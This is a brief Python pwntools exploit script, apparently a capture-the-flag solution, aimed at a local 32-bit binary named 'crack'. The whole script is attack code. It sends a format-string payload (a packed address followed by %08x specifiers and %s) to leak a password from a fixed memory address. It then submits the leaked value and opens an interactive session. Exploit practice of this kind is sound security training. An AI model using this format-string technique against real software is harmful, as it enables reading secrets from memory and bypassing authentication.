from pwn import *

context.arch = "i386"
context.log_level = "DEBUG"

p = process("./crack")
e = ELF("./crack")

libc = ELF("../libc.so.6")

password_addr = 0x0804A048

p.sendlineafter("name ? ", p32(password_addr) + "%08x%08x%08x%08x%08x%08x%08x%08x%08xHihi%s")
p.recvuntil("Hihi")

password = u32(p.recv(4))

print("password is " + hex(password))

if password > 2147483647:
    password = password - 2**32

p.sendlineafter("password :", str(password))

p.interactive()